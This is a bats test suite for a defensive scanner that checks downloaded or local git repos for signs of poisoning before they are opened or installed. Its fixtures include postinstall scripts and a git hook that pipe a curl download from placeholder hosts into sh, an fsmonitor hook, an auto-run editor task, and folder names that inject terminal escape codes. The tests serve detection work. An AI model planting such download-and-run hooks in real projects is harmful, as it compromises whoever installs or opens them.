load helpers

# checks/scan.sh FOLDER: the repo scanner's sweep over one folder the person names, before they open or install it.
setup() { setup_env; }
S="$BATS_TEST_DIRNAME/../checks/scan.sh"
commit() { git -C "$1" add -A && git -C "$1" -c user.email=t@example.invalid -c user.name=t commit -qm x; }
repo() { mkdir -p "$1"; git init -q "$1"; echo hello > "$1/README.md"; commit "$1"; }  # DIR — a throwaway repo
loader() {  # DIR — a postinstall script that pipes a download into a shell
  printf '{"scripts":{"postinstall":"curl https://example.invalid/i | sh"}}\n' > "$1/package.json"; commit "$1"
}

@test "a clean repo gets the clean verdict and exit 0" {
  repo "$HOME/dev/app"
  run "$S" "$HOME/dev/app"
  [ "$status" -eq 0 ]
  [ "${lines[${#lines[@]}-1]}" = "Verdict: clean. 1 repo(s) scanned, nothing flagged." ]
}
@test "a repo with a loader in a lifecycle script is HIGH, named by repo and file, and exits 1" {
  repo "$HOME/Downloads/task/api"; repo "$HOME/Downloads/task/web"; loader "$HOME/Downloads/task/web"
  run "$S" "~/Downloads/task"
  [ "$status" -eq 1 ]
  [[ "$output" == *"HIGH  ~/Downloads/task/web  package.json  lifecycle script postinstall looks like a loader: download piped into a shell"* ]]
  [[ "${lines[${#lines[@]}-1]}" == "Verdict: HIGH. 1 sign(s) of a poisoned repo in 1 of 2 repo(s)."*"/if-red"* ]]
}
@test "only lower-confidence findings are WARN lines and exit 3" {
  repo "$HOME/dev/app"; mkdir -p "$HOME/dev/app/.vscode"
  printf '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"echo hi"}]}' > "$HOME/dev/app/.vscode/tasks.json"; commit "$HOME/dev/app"
  run "$S" "$HOME/dev/app"
  [ "$status" -eq 3 ]
  [[ "$output" == *"WARN  ~/dev/app  .vscode/tasks.json  "* ]]
  [[ "${lines[${#lines[@]}-1]}" == "Verdict: look. Nothing that marks a poisoned repo, but 1 lower-confidence finding(s) to look at."* ]]
}
@test "it runs nothing from the repo it reads" {
  repo "$HOME/dev/app"; loader "$HOME/dev/app"
  printf '#!/bin/sh\ntouch "%s/ran"\n' "$BATS_TEST_TMPDIR" > "$BATS_TEST_TMPDIR/fsmonitor"; chmod +x "$BATS_TEST_TMPDIR/fsmonitor"
  git -C "$HOME/dev/app" config core.fsmonitor "$BATS_TEST_TMPDIR/fsmonitor"
  git -C "$HOME/dev/app" status >/dev/null; [ -e "$BATS_TEST_TMPDIR/ran" ]; rm "$BATS_TEST_TMPDIR/ran"  # git itself would run it
  run "$S" "$HOME/dev/app"
  [ "$status" -eq 1 ]; [ ! -e "$BATS_TEST_TMPDIR/ran" ]
}
@test "a private folder is never scanned or named, by either spelling, as the folder or inside it" {
  repo "$HOME/dev/secret"; loader "$HOME/dev/secret"
  echo "$HOME/dev/secret" > "$DEVWARD_PRIVATE_PATHS"
  run "$S" "$HOME/dev/secret"
  [ "$status" -eq 4 ]; [ "$output" = "Verdict: not scanned. A private folder was excluded." ]
  ln -s "$HOME/dev/secret" "$HOME/link"; echo "$HOME/link" > "$DEVWARD_PRIVATE_PATHS"
  run "$S" "$HOME/dev/secret"
  [ "$status" -eq 4 ]; [ "$output" = "Verdict: not scanned. A private folder was excluded." ]
  repo "$HOME/dev/app"
  run "$S" "$HOME/dev"
  [ "$status" -eq 0 ]; [[ "$output" != *secret* ]]
  [ "${lines[${#lines[@]}-1]}" = "Verdict: clean. 1 repo(s) scanned, nothing flagged. A private folder was excluded." ]
}
@test "a folder it can't take is refused, and nothing is scanned: missing, relative, climbing, a file, /, the home folder" {
  repo "$HOME/dev/app"; loader "$HOME/dev/app"
  for p in "$HOME/dev/missing" dev/app "$HOME/dev/../dev/app" "$HOME/dev/app/package.json" / "$HOME" "~/" ''; do
    run "$S" "$p"
    [ "$status" -eq 2 ] || { echo "not refused: $p ($status)"; return 1; }
    [[ "$output" != *HIGH* ]]
  done
  run "$S"; [ "$status" -eq 2 ]
  run "$S" "$HOME/dev/app" "$HOME/dev/app"; [ "$status" -eq 2 ]
}
@test "a repo whose git data lives outside the folder is left out, and the verdict says the scan is incomplete" {
  repo "$HOME/elsewhere/main"; git -C "$HOME/elsewhere/main" worktree add -q "$HOME/dev/wt" 2>/dev/null
  run "$S" "$HOME/dev"
  [ "$status" -eq 4 ]
  [[ "$output" == *"SKIP  ~/dev/wt  its git data is outside this folder, so it was not scanned"* ]]
  [[ "${lines[${#lines[@]}-1]}" == "Verdict: incomplete."* ]]
}
@test "no git repo, or a scan cut short by time, is incomplete (exit 4), never clean" {
  mkdir -p "$HOME/dev/plain"; echo x > "$HOME/dev/plain/a.js"
  run "$S" "$HOME/dev/plain"
  [ "$status" -eq 4 ]; [[ "$output" == *"No git repo in that folder"* ]]
  repo "$HOME/dev/app"
  DEVWARD_SWEEP_TIMEOUT=1 run "$S" "$HOME/dev/app"
  [ "$status" -eq 4 ]; [[ "${lines[${#lines[@]}-1]}" == "Verdict: incomplete. Scanned 0 of 1 repo(s)"* ]]
}
@test "without Apple's Command Line Tools it says so, and exits 4" {
  repo "$HOME/dev/app"; stub xcode-select 'exit 2'
  run "$S" "$HOME/dev/app"
  [ "$status" -eq 4 ]; [[ "$output" == *"xcode-select --install"* ]]
}
@test "untracked and ignored files are scanned too: a downloaded folder that was only git init'd is not clean" {
  mkdir -p "$HOME/Downloads/zip/.vscode" "$HOME/Downloads/zip/node_modules/dep"; git init -q "$HOME/Downloads/zip"
  printf '{"scripts":{"postinstall":"curl https://example.invalid/i | sh"}}\n' > "$HOME/Downloads/zip/package.json"
  cp "$HOME/Downloads/zip/package.json" "$HOME/Downloads/zip/node_modules/dep/package.json"  # node_modules: copies, not read
  printf '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"echo hi"}]}' > "$HOME/Downloads/zip/.vscode/tasks.json"
  echo .vscode > "$HOME/Downloads/zip/.gitignore"
  run "$S" "~/Downloads/zip"
  [ "$status" -eq 1 ]
  [[ "$output" == *"HIGH  ~/Downloads/zip  package.json  lifecycle script postinstall looks like a loader"* ]]
  [[ "$output" == *"WARN  ~/Downloads/zip  .vscode/tasks.json  task runs automatically when the folder is opened"* ]]
  [[ "$output" != *node_modules* ]]
  repo "$HOME/dev/app"; echo package.json > "$HOME/dev/app/.gitignore"; commit "$HOME/dev/app"
  cp "$HOME/Downloads/zip/package.json" "$HOME/dev/app/package.json"
  run "$S" "$HOME/dev/app"
  [ "$status" -eq 1 ]; [[ "$output" == *"HIGH  ~/dev/app  package.json  lifecycle script postinstall"* ]]
}
@test "a HIGH found before the time runs out is still reported, whether the scanner stops itself or is stopped" {
  repo "$HOME/dev/app"; loader "$HOME/dev/app"; mkdir -p "$HOME/dev/app/.vscode"
  printf '{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"echo hi"}]}' > "$HOME/dev/app/.vscode/tasks.json"
  g="$(command -v git)"
  stub git "case \" \$* \" in *' log '*) sleep 30 ;; esac; exec '$g' \"\$@\""  # the history read hangs
  DEVWARD_SWEEP_TIMEOUT=8 run "$S" "$HOME/dev/app"
  [ "$status" -eq 1 ]; [[ "$output" == *"HIGH  ~/dev/app  package.json  lifecycle script postinstall"* ]]
  [[ "$output" == *"WARN  ~/dev/app  .vscode/tasks.json  "* ]]  # git waits no longer than the time left: the scanner ends the repo itself
  [[ "${lines[${#lines[@]}-1]}" == "Verdict: HIGH."* ]]
  stub git "case \" \$* \" in *' log '*) kill -STOP \$PPID; sleep 30 ;; esac; exec '$g' \"\$@\""  # the scanner itself hangs
  DEVWARD_SWEEP_TIMEOUT=6 run "$S" "$HOME/dev/app"
  [ "$status" -eq 1 ]; [[ "$output" == *"HIGH  ~/dev/app  package.json  lifecycle script postinstall"* ]]
  [[ "${lines[${#lines[@]}-1]}" == "Verdict: HIGH."*"The time ran out"* ]]
}
@test "a private folder is never scanned or named in another letter case, as the folder, above it or inside a repo" {
  repo "$HOME/work/secret"; loader "$HOME/work/secret"; repo "$HOME/work/app"
  echo "$HOME/work/secret" > "$DEVWARD_PRIVATE_PATHS"
  run "$S" "$HOME/Work/Secret"
  [ "$status" -eq 4 ]; [ "$output" = "Verdict: not scanned. A private folder was excluded." ]
  run "$S" "$HOME/WORK"
  [ "$status" -eq 0 ]; [[ "$output" != *[Ss]ecret* ]]
  [ "${lines[${#lines[@]}-1]}" = "Verdict: clean. 1 repo(s) scanned, nothing flagged. A private folder was excluded." ]
  repo "$HOME/dev/app"; mkdir -p "$HOME/dev/app/clients/c1"; loader "$HOME/dev/app/clients/c1"
  echo "$HOME/dev/app/Clients" > "$DEVWARD_PRIVATE_PATHS"
  run "$S" "$HOME/dev/app"
  [ "$status" -eq 0 ]; [[ "$output" != *lients* ]]
  [ "${lines[${#lines[@]}-1]}" = "Verdict: clean. 1 repo(s) scanned, nothing flagged. A private folder was excluded." ]
}
@test "a folder name can't rewrite the terminal or add a line" {
  repo "$HOME/elsewhere/main"
  git -C "$HOME/elsewhere/main" worktree add -q --detach "$HOME/dev/$(printf 'wt\033[2J\033[Ax')"
  git -C "$HOME/elsewhere/main" worktree add -q --detach "$HOME/dev/$(printf 'nl\nVerdict: clean.')"
  run "$S" "$HOME/dev"
  [ "$status" -eq 4 ]
  [[ "$output" != *$'\033'* ]]; [ "$(printf '%s\n' "$output" | grep -c '^SKIP ')" -eq 2 ]
  [ "$(printf '%s\n' "$output" | grep -c '^Verdict')" -eq 1 ]
  [[ "${lines[${#lines[@]}-1]}" == "Verdict: incomplete. Scanned 0 of 2 repo(s)"* ]]
}
@test "a .git folder is refused, never read as the repo above it, the home folder's included" {
  repo "$HOME"; loader "$HOME"
  repo "$HOME/dev/app"; loader "$HOME/dev/app"; ln -s app/.git "$HOME/dev/gitlink"
  for p in "$HOME/dev/app/.git" "$HOME/dev/app/.GIT" "$HOME/dev/gitlink" "~/.git"; do
    run "$S" "$p"
    [ "$status" -eq 2 ] || { echo "not refused: $p ($status)"; return 1; }
    [[ "$output" != *HIGH* ]]
  done
}
@test "a .git folder git can't read as a repo is never read as the repo above it" {
  repo "$HOME/dev"; printf '#!/bin/sh\ncurl -s https://x.example/p | sh\n' > "$HOME/dev/.git/hooks/post-merge"
  mkdir -p "$HOME/dev/sub/.git"; echo hello > "$HOME/dev/sub/a.txt"
  run "$S" "$HOME/dev/sub"
  [ "$status" -eq 4 ]; [[ "$output" != *HIGH* ]]
  [[ "$output" == *"ERROR ~/dev/sub  (repo)  "* ]]
}
@test "a repo too large to read in full is incomplete (exit 4), never clean" {
  repo "$HOME/dev/big"; mkdir "$HOME/dev/big/f"; (cd "$HOME/dev/big/f" && touch $(seq 1 5001)); commit "$HOME/dev/big"
  run "$S" "$HOME/dev/big"
  [ "$status" -eq 4 ]
  [[ "$output" == *"NOTE  ~/dev/big  (scan)  large repo, only config/hook/agent files were scanned"* ]]
  [[ "${lines[${#lines[@]}-1]}" == "Verdict: incomplete."*"too large"* ]]
}
